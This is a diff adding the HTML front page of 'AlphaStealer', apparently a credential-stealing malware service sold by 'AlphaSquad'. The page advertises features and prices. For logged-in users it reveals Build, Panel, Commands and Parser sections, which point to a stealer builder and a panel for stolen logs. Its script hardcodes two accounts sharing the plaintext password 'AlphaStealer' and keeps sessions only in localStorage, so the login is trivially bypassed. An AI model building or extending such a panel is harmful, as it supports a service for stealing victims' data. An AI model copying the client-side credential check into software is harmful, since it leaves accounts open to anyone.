@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlphaStealer | Client</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+<body>
+
+    <!-- Contenedor principal -->
+    <div class="container">
+        <h1>AlphaStealer By AlphaSquad 2024</h1>
+
+        <!-- Botones horizontales -->
+        <div class="horizontal-buttons">
+            <button onclick="window.location.href='/potential.html';">Potential</button>
+            <button onclick="window.location.href='/skills.html';">Skills</button>
+            <button onclick="window.location.href='/features.html';">Features</button>
+            <button onclick="window.location.href='/prices.html';">Prices</button>
+        </div>
+    </div>
+
+    <!-- Botones de navegación en la parte superior -->
+    <div class="top-nav-buttons">
+        <button onclick="window.location.href='/';">Home</button>
+        <button id="build-btn" onclick="window.location.href='/build.html';" style="display:none;">Build</button>
+        <button id="panel-btn" onclick="window.location.href='/panel';" style="display:none;">Panel</button>
+        <button id="commands-btn" onclick="window.location.href='/commands.html';" style="display:none;">Commands</button>
+        <button id="parser-btn" onclick="window.location.href='/parser';" style="display:none;">Parser</button>
+        <button onclick="window.location.href='/contact.html';">Contact</button>
+    </div>
+
+    <!-- Botones de Login, Register o información del usuario -->
+    <div class="top-buttons">
+        <button id="login-btn" onclick="window.location.href='/login.html';">Login</button>
+        <button id="register-btn" onclick="window.location.href='/unknown.html';">Register</button>
+
+        <!-- Mostrar el usuario logueado y botón de Logout -->
+        <div id="user-info" style="display: none;">
+            Logged as <span id="username-display"></span>
+            <button onclick="logout()">Logout</button>
+        </div>
+    </div>
+
+    <script>
+        // Lista de usuarios válidos
+        const validUsers = {
+            'yery': 'AlphaStealer',
+            'oski': 'AlphaStealer'
+        };
+
+        // Al cargar la página, verificar si el usuario está logueado
+        window.onload = function() {
+            const username = localStorage.getItem('username');
+
+            if (username) {
+                // Mostrar el nombre del usuario y ocultar botones de login y registro
+                document.getElementById('user-info').style.display = 'block';
+                document.getElementById('username-display').textContent = username;
+                document.getElementById('login-btn').style.display = 'none';
+                document.getElementById('register-btn').style.display = 'none';
+
+                // Mostrar los botones Build, Panel, Commands y Parser si hay sesión activa
+                document.getElementById('build-btn').style.display = 'block';
+                document.getElementById('panel-btn').style.display = 'block';
+                document.getElementById('commands-btn').style.display = 'block';
+                document.getElementById('parser-btn').style.display = 'block';
+            } else {
+                // Si no hay usuario logueado, los botones Build, Panel, Commands y Parser permanecen ocultos
+                document.getElementById('build-btn').style.display = 'none';
+                document.getElementById('panel-btn').style.display = 'none';
+                document.getElementById('commands-btn').style.display = 'none';
+                document.getElementById('parser-btn').style.display = 'none';
+            }
+        };
+
+        // Función de Login
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Verificar si el usuario y la contraseña son válidos
+            if (validUsers[username] === password) {
+                localStorage.setItem('username', username);
+                window.location.reload(); // Recargar la página para aplicar el cambio
+            } else {
+                alert("Usuario o contraseña incorrectos.");
+            }
+        }
+
+        // Función de Logout
+        function logout() {
+            localStorage.removeItem('username');
+            window.location.reload(); // Recargar la página
+        }
+    </script>
+
+</body>
+</html>
